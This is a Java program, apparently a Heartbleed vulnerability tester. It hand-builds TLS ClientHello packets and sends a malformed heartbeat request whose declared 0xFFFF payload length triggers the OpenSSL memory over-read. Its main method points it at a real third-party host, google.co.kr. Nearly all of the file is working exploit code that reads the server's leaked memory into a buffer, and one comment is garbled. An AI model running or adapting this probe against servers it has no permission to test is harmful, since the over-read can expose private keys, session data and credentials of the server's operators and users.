import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
public class Heartbleed_tester {
	private static class SSLPacket { 
	 	int type, ver, len; 
		byte[] pay = null; 
		
		public SSLPacket(int type, int ver, int len) { 
		 	this.type = type; 
			this.ver = ver; 
		 	this.len = len; 
		 } 
	}; 
	private static byte sslHello_origin[] = new byte[] { 
		0x16, 0x03, 0x02, 0x00, (byte) 0xdc, // Content type = 16 (handshake message); Version = 03 02; Packet length = 00 dc
		0x01, 0x00, 0x00, (byte) 0xd8, //Message type = 01 (client hello); Length = 00 00 d8
		0x03, 0x02, //Client version = 03 02 (TLS 1.1)
		0x53, 0x43, 0x5b, (byte) 0x90, (byte) 0x9d, (byte)0x9b, 0x72, 0x0b, (byte) 0xbc,  0x0c, (byte) 0xbc, 0x2b, (byte) 0x92, (byte) 0xa8, 0x48, (byte) 0x97, (byte) 0xcf, 
		(byte) 0xbd, 0x39, 0x04, (byte) 0xcc, 0x16, 0x0a, (byte) 0x85, 0x03,  (byte) 0x90, (byte) 0x9f, 0x77, 
		0x04, 0x33, (byte) 0xd4, (byte) 0xde,//Random
		
		0x00, //Session id = 00
		0x00, 0x66, //Cipher suite length
		
		(byte) 0xc0, 0x14, //TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
		(byte) 0xc0, 0x0a, //TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
		(byte) 0xc0, 0x22, //TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA 
		(byte) 0xc0, 0x21, //TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
		0x00, 0x39, //TLS_DHE_RSA_WITH_AES_256_CBC_SHA
		0x00, 0x38, //TLS_DHE_DSS_WITH_AES_256_CBC_SHA
		0x00, (byte) 0x88, //TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA 
		0x00, (byte) 0x87, //TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
		(byte) 0xc0, 0x0f, //TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
		(byte) 0xc0, 0x05, //TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
		0x00, 0x35,  //TLS_RSA_WITH_AES_256_CBC_SHA 
		0x00, (byte) 0x84,  //TLS_RSA_WITH_CAMELLIA_256_CBC_SHA 
		(byte) 0xc0, 0x12, //TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
		(byte) 0xc0, 0x08, //TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
		(byte) 0xc0, 0x1c, 
		(byte) 0xc0, 0x1b, 
		0x00, 0x16, 
		0x00, 0x13, 
		(byte) 0xc0, 0x0d,  
		(byte) 0xc0, 0x03, 
		0x00, 0x0a, 
		(byte) 0xc0, 0x13, 
		(byte) 0xc0, 0x09, 
		(byte) 0xc0, 0x1f, 
		(byte) 0xc0, 0x1e, 
		0x00, 0x33, 
		0x00, 0x32,  
		0x00, (byte) 0x9a, 
		0x00, (byte) 0x99, 
		0x00, 0x45, 
		0x00, 0x44, 
		(byte) 0xc0, 0x0e, 
		(byte) 0xc0, 0x04, 
		0x00, 0x2f, 
		0x00, (byte) 0x96,  
		0x00, 0x41, 
		(byte) 0xc0, 0x11, 
		(byte) 0xc0, 0x07, 
		(byte) 0xc0, 0x0c, 
		(byte) 0xc0, 0x02, 
		0x00, 0x05, 
		0x00, 0x04, 
		0x00, 0x15,  
		0x00, 0x12, 
		0x00, 0x09, 
		0x00, 0x14, 
		0x00, 0x11, 
		0x00, 0x08, 
		0x00, 0x06, 
		0x00, 0x03, 
		0x00, (byte) 0xff, //102 cipher suites //51��
		
		0x01, //Compression methods length
		0x00, //Compression method 0 : no compression = 0
		0x00, 0x49, //Extension length = 73
		
		0x00, 0x0b, //ec_point_format
		0x00, 0x04, //length
		0x03, 
		0x00, 
		0x01, 
		0x02,
		
		0x00, 0x0a, 
		0x00, 0x34,  
		0x00, 
		0x32, 
		0x00, 
		0x0e, 
		0x00,
		0x0d, 
		0x00, 
		0x19, 
		0x00, 
		0x0b, 
		0x00, 
		0x0c, 
		0x00, 0x18, 
		0x00, 0x09,  
		0x00, 0x0a, 
		0x00, 0x16, 
		0x00, 0x17, 
		0x00, 0x08, 
		0x00, 0x06, 
		0x00, 0x07, 
		0x00, 0x14, 
		0x00, 0x15,  
		0x00, 0x04, 
		0x00, 0x05, 
		0x00, 0x12, 
		0x00, 0x13, 
		0x00, 0x01, 
		0x00, 0x02, 
		0x00, 0x03, 
		0x00, 0x0f,  
		0x00, 0x10, 
		0x00, 0x11,
		
		0x00, 0x23, 
		0x00, 0x00,
		
		0x00, 0x0f, //heartbeat 
		0x00, 0x01, 
		0x01 
		// Extension
	}; 
	private static byte sslHello[] = new byte[] { 
			0x16, 0x03, 0x02, 0x00, (byte) 0xdc, // Content type = 16 (handshake message); Version = 03 02; Packet length = 00 dc
			0x01, 0x00, 0x00, (byte) 0xd8, //Message type = 01 (client hello); Length = 00 00 d8
			0x03, 0x02, //Client version = 03 02 (TLS 1.1)
			0x53, 0x43, 0x5b, (byte) 0x90, (byte) 0x9d, (byte)0x9b, 0x72, 0x0b, (byte) 0xbc,  0x0c, (byte) 0xbc, 0x2b, (byte) 0x92, (byte) 0xa8, 0x48, (byte) 0x97, (byte) 0xcf, 
			(byte) 0xbd, 0x39, 0x04, (byte) 0xcc, 0x16, 0x0a, (byte) 0x85, 0x03,  (byte) 0x90, (byte) 0x9f, 0x77, 
			0x04, 0x33, (byte) 0xd4, (byte) 0xde,//Random
			
			0x00, //Session id = 00
			0x00, 0x3a, //Cipher suite length
			
			0x00, 0x39, //TLS_DHE_RSA_WITH_AES_256_CBC_SHA
			0x00, 0x38, //TLS_DHE_DSS_WITH_AES_256_CBC_SHA
			0x00, (byte) 0x88, //TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA 
			0x00, (byte) 0x87, //TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
			0x00, 0x35,  //TLS_RSA_WITH_AES_256_CBC_SHA 
			0x00, (byte) 0x84,  //TLS_RSA_WITH_CAMELLIA_256_CBC_SHA 
			0x00, 0x16, 
			0x00, 0x13, 
			0x00, 0x0a, 
			0x00, 0x33, 
			0x00, 0x32,  
			0x00, (byte) 0x9a, 
			0x00, (byte) 0x99, 
			0x00, 0x45, 
			0x00, 0x44, 
			0x00, 0x2f, 
			0x00, (byte) 0x96,  
			0x00, 0x41, 
			0x00, 0x05, 
			0x00, 0x04, 
			0x00, 0x15,  
			0x00, 0x12, 
			0x00, 0x09, 
			0x00, 0x14, 
			0x00, 0x11, 
			0x00, 0x08, 
			0x00, 0x06, 
			0x00, 0x03, 
			0x00, (byte) 0xff, //58 cipher suites //29
			
			0x01, //Compression methods length
			0x00, //Compression method 0 : no compression = 0
			0x00, 0x09, //Extension length = 73
			
			0x00, 0x23, 
			0x00, 0x00,
			
			0x00, 0x0f, //heartbeat 
			0x00, 0x01, 
			0x01 
			// Extension
		}; 
	private static byte sslHb[] = new byte[] { 
 		0x18, 0x03, 0x02, 0x00, 0x03, //Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
 		0x01, (byte) 0xff, (byte) 0xff //Heartbeat message type = 01 (request); Payload length = FF FF
 										//Missing a message that is supposed to be FF FF bytes long
 	}; 
	private static final int defaultSSLPort = 443;
	
	public static void main(String[] args){
		
		heartbleedClient("google.co.kr", 443);
	}
	
	public static void heartbleedClient(String server, int port){
		try{
			Socket s = new Socket(server, port);
			InputStream in = s.getInputStream();
			DataInputStream din = new DataInputStream(in);
			OutputStream out = s.getOutputStream();
			
			System.out.println("Client hello...");
			out.write(sslHello);
			
			System.out.println("Waiting for server hello");
			while(true){
				SSLPacket pkt = sslReadPacket(din);
				System.out.println("Type : " + pkt.type + " Ver : " + pkt.ver + " Len : "+ pkt.len);
				if(pkt.type == 22 && pkt.pay[0] == 0xE) break;
			};
			
			while(true){
				System.out.println("heartbeet...");
				out.write(sslHb);
				SSLPacket pkt = sslReadPacket(din);
				System.out.println("Type : " + pkt.type + " Ver : " + pkt.ver + " Len : " + pkt.len);
				switch(pkt.type){
				case 24:
					
					System.out.println("Server is vulnerable");
					return;
				case 21:
					System.out.println("Server is SAFE");
					return;
				default:
					System.out.println("No heartbeat received.");
					return;
				}
			}
		}catch(IOException e){
			System.err.println(e.getMessage());
		}
	}
	
	private static SSLPacket sslReadPacket(DataInputStream din) throws IOException{
		SSLPacket pkt = sslReadHeader(din);
		byte[] pay = new byte[pkt.len];
		din.readFully(pay);
		pkt.pay = pay;
		return pkt;
	}
	
	private static SSLPacket sslReadHeader(DataInputStream din) throws IOException{
		byte hdr[] = new byte[5];
		din.readFully(hdr);
		ByteBuffer b = ByteBuffer.wrap(hdr);
		int type = b.get();
		int ver = b.getShort();
		int len = b.getShort();
		
		return new SSLPacket(type, ver, len);
	}
}
